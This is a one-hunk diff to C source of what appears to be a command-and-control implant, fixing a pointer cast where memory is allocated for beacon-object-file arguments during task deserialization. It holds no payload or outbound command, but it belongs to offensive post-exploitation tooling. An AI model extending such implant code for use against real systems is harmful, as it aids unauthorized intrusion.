@@ -1185,7 +1185,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             
             if (tlv_type == TLV_CMD_EXECUTE_BOF_START_FILE) { 
                 // bof->file_args;
-                file_args = (PFILE_ARGS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(PFILE_ARGS), MEM_COMMIT, PAGE_READWRITE);
+                file_args = (PFILE_ARGS)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(PFILE_ARGS), MEM_COMMIT, PAGE_READWRITE);
                 
                 file_args->number_of_files = ReadUint32(&buffer);
                 
